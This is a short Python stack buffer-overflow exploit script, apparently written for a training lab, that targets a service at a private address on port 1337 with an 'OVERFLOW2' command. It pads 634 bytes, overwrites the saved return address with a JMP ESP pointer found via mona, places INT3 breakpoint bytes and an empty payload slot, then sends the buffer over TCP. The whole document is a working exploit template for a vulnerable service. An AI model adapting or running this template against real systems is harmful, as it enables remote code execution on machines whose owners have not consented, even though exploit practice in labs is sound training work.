#!/usr/bin/python

import sys,socket, struct

IP="10.10.238.44"
port=1337
SRP_offset = 634
ESP = b"\xCC\xCC\xCC\xCC"                       #INT 3

pointer_JMP_ESP = 0x625011AF                    #PASTE HERE the address found using mona command --> !mona jmp -r esp -cpb "x00...."

payload = b""

buff = b"OVERFLOW2 "                            #Prefix
buff += ("A" * SRP_offset).encode()             #Padding
buff += struct.pack("<I", pointer_JMP_ESP)      #SRP overwrite; function converts address to Little-Endian
buff += ESP                                     #ESP points here 
buff += payload                                 #Payload
buff += b"\r\n"                                 #Postfix

try:
                            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.connect((IP,port))
                            s.send ((buff))
                            s.close()
              
except:
                            print ("Error connecting to server")
                            sys.exit()
